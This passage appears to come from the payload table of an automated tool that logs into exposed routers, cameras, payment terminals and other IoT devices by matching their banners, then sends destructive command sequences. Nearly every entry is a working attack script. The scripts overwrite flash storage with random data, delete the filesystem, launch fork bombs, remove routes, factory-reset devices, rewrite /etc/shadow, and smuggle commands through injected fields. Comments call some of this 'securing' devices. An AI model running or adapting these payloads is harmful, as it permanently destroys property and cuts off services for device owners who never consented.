  	'rm Phone.props', '[>#] ',
  	'cd ..', '[>#] ',
  	'reboot', 'Y/N',
  	'y', 'rebooting',
  ],
  
  # HP Jetdirect
  [ 'hpjetdirect', '.*', 'HP JetDirect',
  	'host-name HACKED', '[>#] ',
  	'ip 127.0.0.1', '[>#] ',
  	'save', 'saved',
  ],
  
  # INTELIMAX stuff
  [ 'intelimax', '.*', '(INTELIMAX #|sh 1\.0)',
    'defconfig', 'y/N',
    'y', '',
  ],

  # Dell idrac SM
  [ 'idrac', '.*', 'status_tag.*:.*COMMAND PROCESSING FAILED',
    'stop /system1', 'stopped',
  ],
  
  # Comtrend Gigabit 802.11n Router
  [ 'comtrend', '.*', 'Comtrend Gigabit',
  	'restore_defaults', 'wait',
  ],
  
  # MikroTik temp
  [ 'mikrotok', '.*', '(\[\S+\@HACKED\] > |HAD UNSAFE PASSWORD)',
    'xxx\r', '[:>] ',
    'ip firewall filter remove 9\r', ' > ',
    'ip firewall filter remove 8\r', ' > ',
    'ip firewall filter remove 7\r', ' > ',
    'ip firewall filter remove 6\r', ' > ',
    'ip firewall filter remove 5\r', ' > ',
    'ip firewall filter remove 4\r', ' > ',
    'ip firewall filter remove 3\r', ' > ',
    'ip firewall filter remove 2\r', ' > ',
    'ip firewall filter remove 1\r', ' > ',
    'ip firewall filter add chain=input src-address=0.0.0.0/1 action=drop\r', ' > ',
    'ip firewall filter add chain=output src-address=0.0.0.0/1 action=drop\r', ' > ',
    # this may sometimes work for low priv accounts (why not before though?)
    'password\r', 'password',
    '%OLDPASS%\r', 'password',
    '%NEWPASS%\r', 'password',
    '%NEWPASS%\r', ' > ',
  ],
  # this payload is based on an old 2015-2016 project for securing routers which were being
  # abused for spam, less relevant now after the 2018 exploits. 
  [ 'mikrotik', '.*', '(MMM.*III.*KKK|MikroTik\sRouterOS|Doublecom\sRouterOS|bad command name )',
    'xxx\r', '[:>] ',
    'xxx\r', '[:>] ',
    'ip socks set enabled no\r', ' > ',
    'ip proxy set enabled no\r', ' > ',
    'ip smb set enabled no\r', ' > ',
    'ip upnp set enabled no\r', ' > ',
    'ip cloud set ddns-enabled no\r', ' > ',
    'tool sniffer stop\r', ' > ',
    'system note set show-at-login yes\r', ' > ',
    'system note set note \"DEVICE HACKED - VULNERABLE OS OR ACCOUNT %OLDUSER% HAD UNSAFE PASSWORD\"\r', ' > ',
    'system identity set name=HACKED\r', ' > ',
    'password\r', 'password',
    '%OLDPASS%\r', 'password', 
    '%NEWPASS%\r', 'password',
    '%NEWPASS%\r', ' > ',
    'ip dns set server=8.8.8.8\r', ' > ',
    'ip dns set allow-remote-requests=no\r', ' > ',
    'ip dns cache flush\r', ' > ',
    'ip service disable winbox\r', ' > ',
    'ip service disable ftp\r', ' > ',
    'ip service disable www\r', ' > ',
    'ip service disable www-ssl\r', ' > ',
    'ip service disable api\r', ' > ',
    'ip service disable api-ssl\r', ' > ',
    'system scheduler remove 9\r', ' > ',
    'system scheduler remove 8\r', ' > ',
    'system scheduler remove 7\r', ' > ',
    'system scheduler remove 6\r', ' > ',
    'system scheduler remove 5\r', ' > ',
    'system scheduler remove 4\r', ' > ',
    'system scheduler remove 3\r', ' > ',
    'system scheduler remove 2\r', ' > ',
    'system scheduler remove 1\r', ' > ',
    'system scheduler remove 0\r', ' > ',
    'system package update check-for-updates\r', ' > ',
    'system package update install\r', ' > ',
    '\r', '%WAIT%', 
    '\r', '%WAIT%', 
    '\r', '%WAIT%', 
    '\r', '%WAIT%', 
    'system reboot\r', 'reboot',
    'y\r', ' > ',
    'system reset-configuration no-defaults=yes\r', 'y/N',
    'y\r', '',
  ],
  
  # Ruckus Wireless
  [ 'ruckus', '.*', '(ruckus>|The command is either unrecognized or incomplete. To view a list of commands that you ca)',
    'ping ;sh', '[$>#] ',
    'cat /dev/urandom >/dev/mtdblock0 &', '',
    'cat /dev/urandom >/dev/mtdblock1 &', '',
    'cat /dev/urandom >/dev/mtdblock2 &', '',
    'cat /dev/urandom >/dev/mtdblock3 &', '',
    'cat /dev/urandom >/dev/mtdblock4 &', '',
    'cat /dev/urandom >/dev/mtdblock5 &', '',
    'cat /dev/urandom >/dev/mtdblock6 &', '',
    'cat /dev/urandom >/dev/mtdblock7 &', '',
    'cat /dev/urandom >/dev/mtdblock8 &', '',
    'cat /dev/urandom >/dev/mtdblock9 &', '',
    'cat /dev/urandom >/dev/mtdblock10 &', '',
    'cat /dev/urandom >/dev/mtdblock11 &', '',
    'route del default', '%WAIT%',
    'enable', '[$>#] ',
    'set-factory', 'Y/n',
    'y', '[$>#] ',
    'exit', '[$>#] ',
    'enable', '[$>#] ',
    'set-factory', 'Y/n',
    'y', '[$>#] ',
  ],
  
  # Welotec.de router console
  [ 'welotec', '.*', '\% command is not supported\!', 
    'enable', 'password:',
    '%OLDPASS%', '[>#] ',
    'erase startup-config', 'filesystem',
    'y', '[>#] ',
    'banner HACKED', '[>#] ',
    'configure terminal', '[>#] ',
    'config import', 'Enter',
    '#BEGIN-CONFIG TIMESTAMP:1082589820\nhttp_enable=0\nhttps_enable=0\ntelnet_enable=0\nfw_block_wan=1\nhostname=HACKED\ndomainname=HACKED.HACKED\nntp_updates=1\nntp_server=`reboot`\n#END-CONFIG CHKSUM:0', 'y/n',
    'y', '[>#] ',
    'config export', '[>#] ',
    'hostname HACKED', '[>#] ',
    'reboot', 'system',
    'y', '[>#] ',
  ],
 	
  # DLINK buggy broken thing
  [ 'dlinkbroke', '.*', 'DLINK-WLAN-AP',
    'set `cat /dev/urandom >/dev/mtdblock5 &`', '[#>] ',
    'set `cat /dev/urandom >/dev/mtdblock4 &`', '[#>] ',
    'set `cat /dev/urandom >/dev/mtdblock3 &`', '[#>] ',
    'set `cat /dev/urandom >/dev/mtdblock2 &`', '[#>] ',
    'set `cat /dev/urandom >/dev/mtdblock1 &`', '[#>] ',
    'set `cat /dev/urandom >/dev/mtdblock0 &`', '[#>] ',
    'set `cat /dev/urandom >/dev/root &`', '[#>] ',
    'set `route del default`', '%WAIT%',
    'reboot', '[#>] ',
  ],
  
  # DLINK DGS Managed Switch guest interface likely 1210  also 1510
  [ 'dgsdlink', '.*', 'DGS\-1\d+', 
    'reset config', '[>#] ',
  ],
 	
 	# Nateks Anstrom 2009 X-stable 
 	[ 'nateks', '.*', 'fmm.*Fault\sand\s+maintenance\smanagement',
 	  '3', '[>#] ',
 	  '8', 'configuration.*no',
 	  'yes', '[>#] ',
 	],
 	
 	# Kingtype router
 	[ 'kingtype', '.*', '(Kingtype\sCONSOLE\sOS|Unknown command:\sls\s-alF\s\/etc\/)', 
 	  'enable', '[>#] ',
 	  'configure terminal', '[>#] ',
 	  'hostname HACKED', '[>#] ',
 	  'write', 'y/n',
 	  'y', '[>#] ',
 	  'exit', '[>#] ',
 	  'tftp download config-file `poweroff` 1.2.3.4', '[>#] ',
 	],
 	  
 	# HP Proliant IPMI card
 	[ 'hpipmi', '.*', '\/\.\/-> ',
 	  'cd /system1/led1', '[>#] ',
 	  'set led1 enabledstate=enabled', '[>#] ',
 	  'cd /system1', '[>#] ',
 	  'stop /system1 -force', '[>#] ',
 	  'stop /system1', '[>#] ',
 	  'cd ..', '[>#] ',
 	  'cd map1', '[>#] ',
 	  'cd nic1', '[>#] ',
 	  'set oemhp_hostname=HACKED', '[>#] ',
 	  'set oemhp_nonvol_networkaddress=1.2.3.4', '[>#] ',
 	  'set networkaddress=1.2.3.4', '[>#] ',
 	],
  
  # some hp thing
  [ 'hpmp', '.*', '\*\*\* Invalid Selection \*\*\*',
  	'cm', '[#>] ',
  	'pc -off', 'Confirm\?',
  	'y', '[#>] ',
  	'mr', 'modem\?',
  	'y', '[#>] ',
  	'dns -all default', 'Confirm\?',
  	'y', '[#>] ',
  	'lc -ip 1.2.3.4 -subnet 255.255.255.0 -gateway 1.2.3.5', 'Confirm\?',
  	'y', '[#>] ',
  ],
  
  # another chinacrap
  [ 'multiqb', '.*', '(MultiQb login|multiqb\.com|quiqnet\.com)',
    'enable', '[#>] ',
    'erase', 'Yes.*No',
    'y', '[#>] ',
  ],

  # Some crap that had string hiper, so calling it that
  [ 'hiper', '.*', 'Saving configuration\.\.\.',
    'clear nvram', '[%#>] ',
    'clear running-config', '[%#>] ',
    'clear ip dhcp server', '[%#>] ',
    'reload', 'y/n',
    'y', 'Restart',
  ],
  # Maipu Communication Technology MPSec maipu.cn
  [ 'maipu', '.*', 'Error.*Command\s\"w\"\sisn\St\ssupported!',
    'timesvc server del all', 'y/n',
    'y', '',
    '', '[#>] ',
    'timesvc interval set 1', '[#>] ',
    'timesvc server add `reboot`', '[#>] ',
    'timesvc start', '[#>] ',
    'write', '[#>] ',
    'reload', 'Y/N\S:',
    'y', 'Y/N\S:',
    'y', 'rebooting',
  ],
  # Protei Linux, some Russian embedded thing.. 
  [ 'protei', '.*', 'No such command for mini_?shell', 
    'restore_config && cat /dev/urandom>/dev/mtdblock3 &', 'shell>',
    'restore_config && cat /dev/urandom>/dev/mtdblock7 &', 'shell>',
    'restore_config && cat /dev/urandom>/dev/mtdblock0 &', 'shell>',
    'restore_config && cat /dev/urandom>/dev/mtdblock1 &', 'shell>',
    'restore_config && cat /dev/urandom>/dev/mtdblock2 &', 'shell>',
    'restore_config && cat /dev/urandom>/dev/mtdblock4 &', 'shell>',
    'restore_config && cat /dev/urandom>/dev/mtdblock5 &', 'shell>',
    'restore_config && cat /dev/urandom>/dev/mtdblock6 &', 'shell>',
    'restore_config && route del default', 'shell>',
  ],
  # netscreen devices
  [ 'netscreen', '.*', '---unknown keyword cat',
    "set hostname HACKED\nsave", '> ',
    'get interface', '> ',
    "set interface trust ip 1.2.3.4/24\nsave", '> ',
    "set interface ethernet0/6 ip 1.2.4.4/24\nsave", '> ',
    "set interface bgroup0 ip 1.2.5.4/24\nsave", '> ',
    "set interface ethernet0/5 ip 1.2.6.4/24\nsave", '> ',
    "set interface ethernet0/4 ip 1.2.7.4/24\nsave", '> ',
    "set interface ethernet0/3 ip 1.2.8.4/24\nsave", '> ',
    "set interface ethernet0/2 ip 1.2.9.4/24\nsave", '> ',
    "set interface ethernet0/1 ip 1.2.10.4/24\nsave", '> ',
    "set interface untrust ip 1.2.11.4/24\nsave", '> ',
    "set interface ethernet0/0 ip 1.2.12.4/24\nsave", '> ',
    "set interface ethernet1 ip 1.2.1.4/24\nsave", '> ',
    "set interface ethernet2 ip 1.2.2.4/24\nsave", '> ',
    "set interface ethernet3 ip 1.2.3.4/24\nsave", '> ',
    "set interface ethernet4 ip 1.2.4.4/24\nsave", '> ',
    "set interface ethernet5 ip 1.2.5.4/24\nsave", '> ',
    "set interface ethernet6 ip 1.2.6.4/24\nsave", '> ',
    "set interface ethernet7 ip 1.2.7.4/24\nsave", '> ',
    "set interface ethernet8 ip 1.2.8.4/24\nsave", '> ',
    "set interface tun.3 ip 1.2.15.4/24\nsave", '> ',
    "set interface tun.2 ip 1.2.16.4/24\nsave", '> ',
    "set interface tun.1 ip 1.2.17.4/24\nsave", '> ',
    "set interface adsl2/0 ip 1.2.13.4/24\nsave", '> ',
    "set interface adsl1/0 ip 1.2.14.4/24\nsave", '> ',
  ],
  
  # Some misc satellite modem iDirect Evolution AMIP satellite
  [ 'idirect', '.*', 'UCLI:\/\$',
    'demo reset', '[#>\$] ',
    'demo start', '[#>\$] ',
    'satellite ele_cut_off 25', '[#>\$] ',
    'zone 1 active no', '[#>\$] ',
    'zone 2 active no', '[#>\$] ',
    'zone 3 active no', '[#>\$] ',
    'zone 4 active no', '[#>\$] ',
    'zone 5 active no', '[#>\$] ',
    'zone 6 active no', '[#>\$] ',
    'zone 7 active no', '[#>\$] ',
    'zone 8 active no', '[#>\$] ',
    'config activate', '[#>\$] ',
    'demo reset', '[#>\$] ',
    'demo start', '[#>\$] ',
  ],
  
  # Avaya P882 etc
  [ 'avaya', '.*', 'Next possible match:',
    'enable', '[#>] ',
    'erase legacy-configs', '[#>] ',
    'erase scripts', '[#>] ',
    'erase startup-config', '[#>] ',
    'legacy-cli', '[#>] ',
    'nvram initialize', '[#>] ',
    'exit', '[#>] ',
    'reset', 'Y/N',
    'n', 'Y/N',
    'y', '[#>] ',
    'reset', 'Y/N',
    'y', '',
  ],
  
  # ExtremeXOS
  [ 'extxos', '.*', 'Extreme Networks',
  	'disable web https', '[>#] ',
  	'disable web http', '[>#] ',
  	'save', 'y/N',
  	'y', '[>#] ',
  	'disable ports all\nsave\ny', '[>#] ',
  	'y', '[>#] ',
  	'save', 'y/N',
  	'y', '[>#] ',
  	'disable telnet\nsave\ny', '',
  	'y', '',
  	'save', 'y/N',
  	'y', '[>#] ',
 	],

	# openwrt without pw - straight to shell - special handler - tend not to be able to fix pw with these so brick 
	[ 'openwrt', 'root/OPENWRTBLANK', '',
		'df', 'root\S+# ',
		'cat /dev/urandom >/dev/mtdblock3 &', 'root\S+# ',
		'cat /dev/urandom >/dev/mtd3 &', 'root\S+# ',
		'cat /dev/urandom >/dev/root &', 'root\S+# ',
		'cat /dev/urandom >/dev/mtdblock2 &', 'root\S+# ',
		'cat /dev/urandom >/dev/mtd2 &', 'root\S+# ',
		'cat /dev/urandom >/dev/mtdblock1 &', 'root\S+# ',
		'cat /dev/urandom >/dev/mtd1 &', 'root\S+# ',
		'cat /dev/urandom >/dev/mtdblock0 &', 'root\S+# ',
		'cat /dev/urandom >/dev/mtd0 &', 'root\S+# ',
		'cat /dev/urandom >/dev/mtdblock4 &', 'root\S+# ',
		'cat /dev/urandom >/dev/mtdblock5 &', 'root\S+# ',
		'cat /dev/urandom >/dev/mtdblock6 &', 'root\S+# ',
		'cat /dev/urandom >/dev/mtdblock7 &', 'root\S+# ',
		'route del default', '%WAIT%',
		'reboot', 'root\S+# ',
	],
 
	# Linux P-661HNU special lovah
	[ "p661", ".*", 'Linux\sP-661.*',
		'flash_unlock', '',
		'flash_unlock /dev/mtd0', '',
		'flash_eraseall /dev/mtd0 &', '',
		'ftl_format /dev/mtd0 &', '',
		'ftl_format /dev/mtd1 &', '',
		'ftl_format /dev/mtd2 &', '',
		'ftl_format /dev/mtd3 &', '',
		'ftl_format /dev/mtd4 &', '',
		'rfdformat /dev/mtd0 &', '',
		'rfdformat /dev/mtd1 &', '',
		'rfdformat /dev/mtd2 &', '',
		'rfdformat /dev/mtd3 &', '',
		'rfdformat /dev/mtd4 &', '',
		'route del default;iproute del default;rm -rf /* 2>/dev/null &', '[#$>] ',
		'iptables -F;iptables -t nat -F;iptables -A OUTPUT -j DROP', '%WAIT% ',
		'd(){ d|d & };d', '[#$>] ', 
		'sysctl -w net.ipv4.tcp_timestamps=0;sysctl -w kernel.threads-max=1', '%WAIT% ',
		'halt -n -f', '[#$>] ',
		'reboot', '[#$>] ',
	],

	# CalAmp Fusion LTE special handler - does not have actual root but
	# supports passwd update.. has to be rebooted using fork
	[ "fusion", ".*", 'FUSION-LTE.*admin', 
		'passwd', 'Old password: ', 
		'%OLDPASS%', 'New password: ',
		'%NEWPASS%', 'Retype password: " ',
		'%NEWPASS%', '[#$>] ',
		'cat /etc/shadow', '[#$>] ',
		'd(){ d|d & };d', '%TERM%',
	],
	
	# some china device by Tuyi Network Technology (tu-e.cn)
	# choppy telnet - need the spaces to wake up interface
	[ 'tudc', 'admin/admin', '(DC-5\d00|FR30\d\d|V5-5\d00|RG-ACE|NB-2\d00)',
		'net traceroute 127.0.0.1 ;sh', 'address:',
		' ', '[#$>] ',
		' ', '[#$>] ',
		' ', '[#$>] ',
		'dd if=/dev/urandom of=/dev/root', '[#$>] ',
		' ', '[#$>] ',
		'ip route del default', '[#$>] ',
		' ', '[#$>] ',
		'd() { d|d & }; d', '[#$>] ',
		' ', '[#$>] ',
	],

	# Arago Project dm365 - some quirky embedded Linux
	[ "dm365", ".*", 'Linux dm365',
		'telnet localhost', 'login: ',
		'root', 'Password: ',
		'radiant', '[#$] ', 
		"fdisk /dev/mtd6", 'm\sfor\shelp\S?: ', 
		"w", '[#$] ',
		"fdisk /dev/mtd7", 'm\sfor\shelp\S?: ', 
		"w", '[#$] ',
		"fdisk /dev/mtd8", 'm\sfor\shelp\S?: ', 
		"w", '[#$] ',
		'rm -rf /* 2>/dev/null &', '[#$] ',
		'route del default;iproute del default', '[#$] ',
	],
	[ "dm365", ".*", 'Linux ENC',
		'telnet localhost', 'login: ',
		'root', 'Password: ',
		'radiant', '[#$] ', 
		"fdisk /dev/mtd6", 'm\sfor\shelp\S?: ', 
		"w", '[#$] ',
		"fdisk /dev/mtd7", 'm\sfor\shelp\S?: ', 
		"w", '[#$] ',
		"fdisk /dev/mtd8", 'm\sfor\shelp\S?: ', 
		"w", '[#$] ',
		'rm -rf /* 2>/dev/null &', '[#$] ',
		'route del default;iproute del default', '[#$] ',
	],

	# SRX5308 lova
	[ "srx", ".*", 'SRX\d\d\d\d.*wuname',
		"\x03\x03util restore_factory_defaults", "Y/N\S*?",
		"y", '%TERM%',
	],
	[ "srxlike", ".*", '\S\d\d.*wuname-a',
		"\x03\x03util restore_factory_defaults", "Y/N\S*?",
		"y", '%TERM%',
	],

	# ZySH garbage
	[
		"zysh", ".*", 'ZySH> ',
		"?", "SH>",
	],

  # buggy ADSL2PlusRouter
  [ 'adsl2plus', '.*', '(ADSL2PlusRouter login|Welcome to Login)',
    '', '',   # have to push linefeeds to get around the buggy CLI
    '', '', 
    'system reset', '',
    '', '> ', 
    '', '> ', 
    '', '> ', 
  ],

	# KICC payment terminal, freescale semiconductors
  # yes, there used to be a bunch of these on the net back in 2016
	[ "kicc", ".*", '0RU54ozt\SEXeK8sW9TQaOFRxkJ4rvI', 
		'telnet localhost', 'login: ',
		'root', 'Password: ',
		'upsups', '[#$] ', 
		"fdisk /dev/mtd0", 'm\sfor\shelp\S?: ', 
		"w", '[#$] ',
		"fdisk /dev/mtd1", 'm\sfor\shelp\S?: ', 
		"w", '[#$] ',
		"fdisk /dev/mtd2", 'm\sfor\shelp\S?: ', 
		"w", '[#$] ',
		"fdisk /dev/mtd3", 'm\sfor\shelp\S?: ', 
		"w", '[#$] ',
		"fdisk /dev/mtd4", 'm\sfor\shelp\S?: ', 
		"w", '[#$] ',
		'route del default;rm -rf /* 2>/dev/null &', '%TERM%',
	],    
	[ "kicc", ".*", 'y3olkb5BzsLZ1ZbovcECW1', 
		'telnet localhost', 'login: ',
		'root', 'Password: ',
		'kicc123', '[#$] ', 
		"fdisk /dev/mtd0", 'm\sfor\shelp\S?: ', 
		"w", '[#$] ',
		"fdisk /dev/mtd1", 'm\sfor\shelp\S?: ', 
		"w", '[#$] ',
		"fdisk /dev/mtd2", 'm\sfor\shelp\S?: ', 
		"w", '[#$] ',
		"fdisk /dev/mtd3", 'm\sfor\shelp\S?: ', 
		"w", '[#$] ',
		"fdisk /dev/mtd4", 'm\sfor\shelp\S?: ', 
		"w", '[#$] ',
		'route del default;rm -rf /* 2>/dev/null &', '%WAIT%',
		'while [ 1 ]; do echo test; d() { d | d & }; d; sleep 10; done &', '%TERM%',
	],    

	# artila computer in box things
	[ 'artila', 'guest/guest', 'guest@M5',
		'while [ 1 ]; do echo test; ps aux | grep "guest" | grep -v "sh" | grep -v "ps aux" | grep -v "grep" | grep -v "awk" | grep -v "xargs" | awk \'{print $2}\' | xargs kill -9; done &', '%TERM%',
	],

	# crappy freescale fallback - system that can't be fixed.. try to secure the insecure user/user
	[ "freescale", "user/user", 'user@freescale',
		# first create a shell with a distinct name
		"ash", '[#$>] ',
		# then start killing everything else 
		'while [ 1 ]; do echo test; ps | grep "user" | grep -v "ash" | grep -v " ps " | grep -v "grep" | grep -v "awk" | grep -v "xargs" | awk \'{print $1}\' | xargs kill -9; done &', '[#$>] ',
	],

	# crappy Matrix HVR/NVR fallback - another system that can't be fixed.. just run simple telnet/proc killer to temp
  # inoculate it
	[ 'matrix', '.*', '@Matrix-.*VR',
		'ash', '[#$>] ',
		'while [ 1 ]; do echo test; kill `ps aux | grep "admin" | grep -v "ash" | grep -v "ps aux" | grep -v "grep" | grep -v "awk" | awk \'{print $2}\'`; done &', '[#$>] ',
		'while [ 1 ]; do echo test; killall -9 sh; done &', '[#$>] ',
	],

	# Merit Lilin NVR11\d, admin/1111, operator/2222, guest/3333 
	[ 'merit', 'admin/1111', 'Linux NVR',
		'ash', '[#$>] ',
		'while [ 1 ]; do echo test; kill `ps aux | grep "admin" | grep -v "ash" | grep -v "ps aux" | grep -v "grep" | grep -v "awk" | awk \'{print $1}\'`; done &', '[#$>] ',
		'while [ 1 ]; do echo test; killall -9 sh; done &', '[#$>] ',
	],
	[ 'merit', 'admin/1111', '(Linux DVR|Welcome to DVR Series)',
		'ash', '[#$>] ',
		'while [ 1 ]; do echo test; kill `ps w | grep "admin" | grep -v "ash" | grep -v "ps w" | grep -v "grep" | grep -v "awk" | awk \'{print $1}\'`; done &', '[#$>] ',
		'while [ 1 ]; do echo test; killall -9 sh; done &', '[#$>] ',
	],

	# user OpenWrt with limited access
	[ 'openwrt', 'user/user', 'user@\S+:~\$',
		'ps | grep "user" | grep -v `echo $$` | grep -v " ps " | grep -v "grep" | grep -v "awk" | grep -v "xargs" | awk \'{print $1}\' | xargs kill -9', '[#$>] ',
		'cat /etc/passwd', '[#$>] ',
		'sh', '[#$>] ',
		'while [ 1 ]; do echo test; ps | grep "user" | grep -v " sh " | grep -v " ps " | grep -v "grep" | grep -v "awk" | grep -v "xargs" | awk \'{print $1}\' | xargs kill -9; done &', '[#$>] ',
	],

	# avahi thingy with limited access
	[ 'avahi', 'guest/guest', 'avahi',
		'ash', '[#$>] ',
		'cat /etc/shadow', '[#$>] ',
		'while [ 1 ]; do echo test; ps | grep "1000" | grep -v "ash" | grep -v " ps " | grep -v "grep" | grep -v "awk" | grep -v "xargs" | awk \'{print $1}\' | xargs kill -9; done &', '[#$>] ',
	],    
	
	# some crappy Chinese AIM> prompt routers
	[ 'cnaim', '.*', 'Error: Invalid input',
		'net ip lan 127.0.0.1\nsave\nping ;cp${IFS}/dev/urandom${IFS}/dev/mtdblock0&&', '[#$>] ',
	],

	# sathesh some silly IoT
	[ 'sathesh', 'root/root', 'sathesh:TJ06VabosxcTg',
		'ls -al /sbin/', '[#$>] ', 
		'fdisk -l', '[#$>] ', 
		'df', '[#$>] ', 
		'route del default;iproute del default;rm -rf /* 2>/dev/null &', '[#$>] ',
		'iptables -F;iptables -t nat -F;iptables -A OUTPUT -j DROP', '%TERM%',
	],

	# MI-MINI
	[ 'mini', '.*', 'Linux MI-MINI',
		'dd if=/dev/urandom of=/dev/mtdblock0 &', '', 
		'dd if=/dev/urandom of=/dev/mtdblock1 &', '', 
		'dd if=/dev/urandom of=/dev/mtdblock2 &', '', 
		'dd if=/dev/urandom of=/dev/mtdblock3 &', '', 
		'dd if=/dev/urandom of=/dev/mtdblock4 &', '', 
		'dd if=/dev/urandom of=/dev/mtdblock5 &', '', 
		'dd if=/dev/urandom of=/dev/root &', '', 
		'dd if=/dev/urandom of=/dev/ram0 &', '%WAIT%', 
		'route del default;rm -rf /* &', '%TERM%', 
	],
		
	# TVR31
	[ 'tvr', '.*', 'admin@TVR',
		'su root', '[#$>] ',
		'df', '[#$>] ',
		'dd if=/dev/urandom of=/dev/hda1 &', '', 
		'dd if=/dev/urandom of=/dev/hdb1 &', '', 
		'dd if=/dev/urandom of=/dev/mtd0 &', '', 
		'dd if=/dev/urandom of=/dev/mtd1 &', '', 
		'dd if=/dev/urandom of=/dev/mtdblock4 &', '', 
		'route del default;dd if=/dev/urandom of=/dev/ram0 &', '[#$>] ', 
		'rm -rf /mtd0/* &', '%WAIT%', 
		'd(){ d|d & };d', '%TERM%', 
	],

	# avc XCOM - some kind of telephony thing? does not require a login though so explains why never seen in telnet*
	[ 'avc', '.*', 'APPCOM:',
		'shell', '[#$>] ',
		'df', '[#$>] ',
		'cat /dev/urandom >/dev/hda &', '',
		'cat /dev/urandom >/dev/hda1 &', '',
		'cat /dev/urandom >/dev/hda2 &', '',
		'cat /dev/urandom >/dev/hda3 &', '',
		'cat /dev/urandom >/dev/hda4 &', '',
		'route del default;rm -rf / 2>/dev/null &', '%WAIT%',
		'd() { d | d & }; d 2>/dev/null', '%TERM%',
	],    

  # hikvision IoS special handling
  [ 'hikvision', 'root/.*', 'hikvision',
    # note: some very quirky Hik shells require us to su to root even if we log in as root!
    'su root', 'Password: ',
    '%OLDPASS%', '[#$>] ',
    'dd if=/dev/urandom of=/dev/sda &', '[#$>] ', 
    'dd if=/dev/urandom of=/dev/sdb &', '[#$>] ', 
    'dd if=/dev/urandom of=/dev/mtdblock0 &', '[#$>] ', 
    'dd if=/dev/urandom of=/dev/mtdblock1 &', '[#$>] ', 
    'dd if=/dev/urandom of=/dev/mtdblock2 &', '[#$>] ', 
    'dd if=/dev/urandom of=/dev/mtd0 &', '[#$>] ', 
    'dd if=/dev/urandom of=/dev/mtd1 &', '[#$>] ', 
    'dd if=/dev/urandom of=/dev/mtd2 &', '%WAIT%', 
    'dd if=/dev/urandom of=/dev/root &', '[#$>] ', 
    'route del default;dd if=/dev/urandom of=/dev/ram0 &', '%WAIT%', 
  ],
  [ 'hikvision', 'root/hikvision', '.*',
    # note: some very quirky Hik shells require us to su to root even if we log in as root!
    'su root', 'Password: ',
    '%OLDPASS%', '[#$>] ',
    'dd if=/dev/urandom of=/dev/sda &', '[#$>] ', 
    'dd if=/dev/urandom of=/dev/sdb &', '[#$>] ', 
    'dd if=/dev/urandom of=/dev/mtdblock0 &', '[#$>] ', 
    'dd if=/dev/urandom of=/dev/mtdblock1 &', '[#$>] ', 
    'dd if=/dev/urandom of=/dev/mtdblock2 &', '[#$>] ', 
    'dd if=/dev/urandom of=/dev/mtd0 &', '[#$>] ', 
    'dd if=/dev/urandom of=/dev/mtd1 &', '[#$>] ', 
    'dd if=/dev/urandom of=/dev/mtd2 &', '%WAIT%', 
    'dd if=/dev/urandom of=/dev/root &', '[#$>] ', 
    'route del default;dd if=/dev/urandom of=/dev/ram0 &', '%WAIT%', 
  ],
  [ 'hikvision', '.*', 'hikvision',
    # here's an unprivileged account attack on firmware, will render some units unrebootable
    'echo HAKVISION >/home/hik/hicore.tar.gz', '[#$>] ', 
    'echo HAKVISION >/home/hik/uImage', '[#$>] ', 
    'echo dd if=/dev/urandom of=/dev/mtdblock0 >/home/hik/start.sh', '[#$>] ', 
    'echo dd if=/dev/urandom of=/dev/mtdblock1 >>/home/hik/start.sh', '[#$>] ', 
    'echo dd if=/dev/urandom of=/dev/mtdblock2 >>/home/hik/start.sh', '[#$>] ', 
    'echo reboot >>/home/hik/start.sh', '[#$>] ',
    # a few extras for alt firmwares
    'echo HAKVISION >/home/hik/webs.tar.gz', '[#$>] ', 
    'echo HAKVISION >/home/hik/hicore.tar.lzma', '[#$>] ', 
    # try to overwrite /etc/shadow with login root/hikvision :)
    'echo root:\$1\$ChRPh3ur\$Yy6bjTErRXoajEZ1jao79/:14194:0:99999:7::: >/etc/shadow', '[#$>] ',
    'echo hikvision:\$1\$ChRPh3ur\$Yy6bjTErRXoajEZ1jao79/:14194:0:99999:7::: >>/etc/shadow', '[#$>] ',
    'd() { echo xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; d|d & };d 2>>/%NEWPASS% >>/%NEWPASS%2', '[#$>] ', 
    'd() { echo xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; d|d & };d 2>>/home/app/%NEWPASS% >>/home/app/%NEWPASS%2', '[#$>] ', 
    'd() { echo xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; d|d & };d 2>>/tmp/%NEWPASS% >>/tmp/%NEWPASS%2', '[#$>] ', 
    'while [ 1 ]; do cat /%NEWPASS% >>/%NEWPASS%3; cat /%NEWPASS%2 >>/%NEWPASS%3 done &', '[#$>] ', 
  ],
  [ 'hikvision', 'hikvision/.*', '.*',
    # here's an unprivileged account attack on firmware, will render some units unrebootable
    'echo HAKVISION >/home/hik/hicore.tar.gz', '[#$>] ', 
    'echo HAKVISION >/home/hik/uImage', '[#$>] ', 
    'echo dd if=/dev/urandom of=/dev/mtdblock0 >/home/hik/start.sh', '[#$>] ', 
    'echo dd if=/dev/urandom of=/dev/mtdblock1 >>/home/hik/start.sh', '[#$>] ', 
    'echo dd if=/dev/urandom of=/dev/mtdblock2 >>/home/hik/start.sh', '[#$>] ', 
    'echo reboot >>/home/hik/start.sh', '[#$>] ',
    # a few extras for alt firmwares
    'echo HAKVISION >/home/hik/webs.tar.gz', '[#$>] ', 
    'echo HAKVISION >/home/hik/hicore.tar.lzma', '[#$>] ', 
    # try to overwrite /etc/shadow with login root/hikvision :)
    'echo root:\$1\$ChRPh3ur\$Yy6bjTErRXoajEZ1jao79/:14194:0:99999:7::: >/etc/shadow', '[#$>] ',
    'echo hikvision:\$1\$ChRPh3ur\$Yy6bjTErRXoajEZ1jao79/:14194:0:99999:7::: >>/etc/shadow', '[#$>] ',
